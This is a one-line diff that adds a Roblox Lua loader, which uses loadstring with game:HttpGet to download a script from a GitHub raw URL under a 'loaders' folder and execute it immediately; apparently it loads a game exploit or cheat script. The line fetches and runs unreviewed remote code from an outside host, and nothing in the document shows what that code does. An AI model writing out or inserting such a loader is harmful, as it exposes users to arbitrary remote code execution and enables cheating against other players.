@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/anomaly-lockdown-tweaked-spam1-a12pymxrl00k1r.lua"))()
